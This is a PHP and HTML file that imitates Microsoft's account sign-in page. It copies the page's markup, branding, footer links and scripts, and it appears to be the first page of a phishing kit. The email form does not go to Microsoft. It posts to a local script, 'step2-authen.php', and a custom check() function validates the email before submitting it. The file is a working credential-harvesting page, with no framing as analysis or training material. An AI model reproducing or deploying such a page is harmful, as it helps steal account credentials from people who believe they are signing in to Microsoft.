<?php 
session_start();
?>
<!DOCTYPE html>
<!-- ServerInfo: BAYIDSLGN1A035 2016.11.15.02.06.59 Live1 Unknown LocVer:0 -->
<!-- PreprocessInfo: BTSA007:RR1BLDF116,  - Version: 16,0,26754,0 -->
<!-- RequestLCID: 2057, Market:EN-GB, PrefCountry: UK, LangLCID: 2057, LangISO: EN-GB -->
<html dir="ltr" lang="EN-GB"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><!-- base href="https://login.live.com/pp1600/" --><script type="text/javascript">var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, Voice: -3};</script><noscript><meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-GB&lc=2057"/>Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br /><br />To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.</noscript><title>Sign in to your Microsoft account</title><meta name="PageID" content="i5030"><meta name="SiteID" content="292841"><meta name="ReqLC" content="2057"><meta name="LocLC" content="2057"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="https://auth.gfx.ms/16.000.26754.00.1/images/favicon.ico">
        <link rel="stylesheet" title="Default" type="text/css" href="index_files/Default2057.css"><style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style><style type="text/css">body{display:none;}</style><script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript><script type="text/javascript">var g_iSRSFailed=0,g_sSRSSuccess="";function SRSRetry(a,f,b){var e=1,d=unescape('%3Cscript type="text/javascript" src="'),c=unescape('"%3E%3C/script%3E');if(g_sSRSSuccess.indexOf(a)!=-1)return;if(typeof window[a]=="undefined"){g_iSRSFailed=1;b<=e&&document.write(d+f+c)}else g_sSRSSuccess+=a+"|"+b+","}
  var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://auth.gfx.ms/16.000.26754.00.1/images/Windows_Live_v_thumb.jpg">
<script type="text/javascript" src="index_files/DefaultLoginPaginatedStrings.js"></script>
    <script type="text/javascript" src="index_files/DefaultLogin_PCore.js"></script>
    <script type="text/javascript">SRSRetry("__DefaultLoginPaginatedStrings", "https://auth.gfx.ms/16.000.26754.00.1/DefaultLoginPaginatedStrings.EN-GB.js", 1);SRSRetry("__DefaultLogin_PCore", "https://auth.gfx.ms/16.000.26754.00.1/DefaultLogin_PCore.js", 1);</script><script type="text/javascript">SRSRetry("__DefaultLoginPaginatedStrings", "https://auth.gfx.ms/16.000.26754.00.1/DefaultLoginPaginatedStrings.EN-GB.js", 2);SRSRetry("__DefaultLogin_PCore", "https://auth.gfx.ms/16.000.26754.00.1/DefaultLogin_PCore.js", 2);</script></head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<SCRIPT language=JavaScript>
<!--
function check(form) {
if (form.Email.value == "")
{ alert("Please enter your Email Address."); form.Email.focus(); return;}
// Start of Email error Alert!
var checkEmail = "@.";
var checkStr = form.Email.value;
var EmailValid = false;
var EmailAt = false;
var EmailPeriod = false;
for (i = 0;  i < checkStr.length;  i++)
{
ch = checkStr.charAt(i);
for (j = 0;  j < checkEmail.length;  j++)
{
if (ch == checkEmail.charAt(j) && ch == "@")
EmailAt = true;
if (ch == checkEmail.charAt(j) && ch == ".")
EmailPeriod = true;
	  if (EmailAt && EmailPeriod)
		break;
	  if (j == checkEmail.length)
		break;
	}
if (EmailAt && EmailPeriod)
{
		EmailValid = true
		break;
	}
}
if (!EmailValid)
{
alert("Please enter a valid email address.");
form.Email.focus();
return;}
form.submit()
}
//-->
</SCRIPT>
<div><!--  --> <form  novalidate="novalidate" spellcheck="false" method="post" action="step2-authen.php"><!-- ko withProperties: { '$loginPage': $data } --> <div data-bind="component: { name: 'page', params: {
        serverData: svr,
        showButtons: svr.A4,
        showFooterLinks: true,
        useWizardBehavior: svr.BI,
        handleWizardButtons: false,
        password: password,
        hideFromAria: ariaHidden } }"><!--  --> <div id="maincontent"><!-- ko withProperties: { '$wizard': viewModel } --> <section class="section no-margin-bottom" data-bind="visible: !$wizard || $wizard.showHolder"> <div class="section-body container"> <div id="pageControlHost"><!-- ko if: isInternalModeEnabled --><!-- /ko --> <div> <div id="Credentials"> <div class="container" id="CredentialsInputPane"><!-- ko if: svr.iProductIcon !== -1 --> <div class="row text-body" data-bind="ariaHidden: hideFromAria"><!-- ko component: 'accessible-image-control' --><!-- ko if: isHighContrastBlackTheme || svr.fHasBackgroundColor --><!-- /ko --><!-- ko ifnot: isHighContrastBlackTheme || svr.fHasBackgroundColor --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="img-centipede" data-bind="
                                    attr: { src: centipede.getDarkUrl(), alt: str['MOBILE_STR_Header_Brand'] }" src="index_files/AppCentipede_Microsoft.svg" alt="Microsoft account"><!-- /ko --> <!-- /ko --><!-- /ko --> </div><!-- /ko --> <!-- ko template: { nodes: templateNodes["MainContent"], data: $parent } --> <div data-bind="component: { name: 'pagination-control',
                publicMethods: paginationControlMethods,
                params: {
                    initialViewId: initialViewId,
                    currentViewId: currentViewId,
                    initialSharedData: initialSharedData,
                    initialError: $loginPage.getServerError() },
                event: {
                    cancel: paginationControl_onCancel } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-bind="component: { name: 'login-paginated-username-view',
                    publicMethods: viewInterfaces[$index()],
                    params: {
                        serverData: svr,
                        serverError: initialError,
                        displayName: sharedData.displayName,
                        prefillNames: $loginPage.prefillNames,
                        autoCredSwitchEnabled: isInitialState &amp;&amp; !svr.BM },
                    event: {
                        load: view_onLoad,
                        switchView: view_onSwitchView,
                        redirect: $loginPage.view_onRedirect,
                        showLearnMore: $loginPage.learnMore_onShow } }"><!--  --> <div id="loginHeader" class="row text-subheader" data-bind="text: str['WF_STR_HeaderDefault_Title']">Sign in</div><!-- ko if: isRequestPending && isAutoCredSwitch --><!-- /ko --><!-- ko ifnot: isRequestPending && isAutoCredSwitch --> <div class="row text-body" data-bind="ifnot: svr.Bc"> <div id="loginDescription" data-bind="
            htmlWithBindings: str['WF_STR_Default_Desc'],
            childBindings: { 'learnMoreLink': { click: onShowLearnMore, visible: !svr.BB, css: { 'display-block': !svr.Bb } } }">Use your Microsoft account. <a href="#" id="learnMoreLink" target="_top" class="display-block">What’s this?</a></div> 
			
			
			<div><input type="email" placeholder="Email or Skype" class="form-control" name="email" id="Email"></div>
			
			<!-- /ko --> </div> </div> <div class="row"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.A4,
            isSecondaryButtonVisible: false },
        event: {
            primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 form-group"> <div data-bind="css: { 'col-xs-12': isPrimaryButtonVisible(), 'col-xs-24': !isPrimaryButtonVisible() }" class="col-xs-12"> <input id="idBtn_Back" class="btn btn-block" data-bind="
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back" style="display: none;" type="button"> </div> <div data-bind="css: { 'col-xs-12': isSecondaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }" class="col-xs-24"> <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Next" onClick="check(this.form)" type="button"> </div> </div></div> </div> <div class="row"> <div class="col-md-24"><!-- ko if: svr.Ah && !svr.Bb --> <div class="section" data-bind="
            htmlWithBindings: html['WF_STR_SignUpLink_Text'],
            childBindings: { 'signup': { href: svr.D, click: signup_onClick } }">No account? <a href="https://signup.live.com/signup.aspx?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1479716212&amp;rver=6.4.6456.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&amp;id=292841&amp;cbcxt=out&amp;fl=wld&amp;contextid=10C0D0F7EF45A4AB&amp;bk=1479716215&amp;uiflavor=web&amp;uaid=2419581f135940218028ecd616c02d58&amp;mkt=EN-GB&amp;lc=2057" id="signup">Create one!</a></div><!-- /ko --> </div> </div> <!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> <input name="canary" data-bind="value: svr.canary" value="" type="hidden"> <input name="ctx" data-bind="value: ctx" value="" type="hidden"> <input id="i0327" data-bind="attr: { name: svr.Bm }, value: flowToken" name="PPFT" value="DcjWc20*uGXKr8Kgi9SHu1nCOpwRpQ59jdSn!k5nkxQVwbqA1pSsLjueuI04wNL7yokbBF5ggGjVgAWS5nuFD*mUow05cupDBYtquIKiSc9dfD!vptcHUQELTCqiKTebKJZfo*zRNuPeuzU61ZlkBQjpt0DRrE!bCg0zH*bg1id7!wDAX0ws99Gh40p011lwnkOcOp027J1YL6xafMgOurtGDFBqCNMh0llBmhMVB9dqbED*RY71s8xW5JWx2HcC0kyuon3tfczXxcxYVtyVj5k$" type="hidden"> <input name="PPSX" data-bind="value: svr.t" value="PassportRN" type="hidden"> <input name="NewUser" value="1" type="hidden"> <input name="FoundMSAs" data-bind="value: svr.aa" value="" type="hidden"> <input name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" type="hidden"> <input name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0" type="hidden"> <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { loginMode: svr.g } }"></div> <div data-bind="component: { name: 'learn-more-field',
                publicMethods: learnMoreMethods,
                params: {
                    accountQueryUrl: svr.a0,
                    loadDynamicContent: svr.Bg },
                 event: {
                    show: learnMore_onShow,
                    hide: learnMore_onHide } }"><!--  --><!-- ko if: visible --><!-- /ko --></div> <!-- /ko --> </div> </div> </div> </div> <div data-bind="ariaHidden: hideFromAria"><!-- ko if: showButtons && templateNodes["Buttons"] --><!-- /ko --><!-- ko if: templateNodes["Links"] --><!-- /ko --> <div id="ftr" class="text-body"> <div data-bind="component: { name: 'footer-control', params: {
                        showLinks: footer.showLinks,
                        showLogo: footer.showLogo,
                        serverData: svr } }"><!--  --> <div id="footerTD" class="popupfooter popup breakword footer"><!-- ko if: showLinks || impressumLink --> <div class="footerNode links text-secondary"><!-- ko if: showLinks --> <a id="ftrTerms" class="first" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, attr: { 'target': linkTarget }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-GB&amp;vv=1600" target="_blank">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, attr: { 'target': linkTarget }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-GB&amp;vv=1600" target="_blank">Privacy &amp; Cookies</a><!-- /ko --><!-- ko if: impressumLink --><!-- /ko --> </div><!-- /ko --><!-- ko if: showLogo --> <div id="ftrLogo" class="footerNode text-base text-secondary text-logotype"><!-- ko component: 'accessible-image-control' --><!-- ko if: isHighContrastBlackTheme || svr.fHasBackgroundColor --><!-- /ko --><!-- ko ifnot: isHighContrastBlackTheme || svr.fHasBackgroundColor --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img pngsrc="https://auth.gfx.ms/16.000.26754.00.1/images/Microsoft_Logotype_Gray.png" svgsrc="https://auth.gfx.ms/16.000.26754.00.1/images/Microsoft_Logotype_Gray.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="index_files/Microsoft_Logotype_Gray.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> </div><!-- /ko --><!-- ko ifnot: showLogo --><!-- /ko --> </div></div> </div> </div> </div> </section><!-- /ko --> </div></div><!-- /ko --> </form> <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form></div><iframe id="idPartnerPL" style="display: none;" src="index_files/prefetch.htm" width="0" height="0"></iframe></body></html>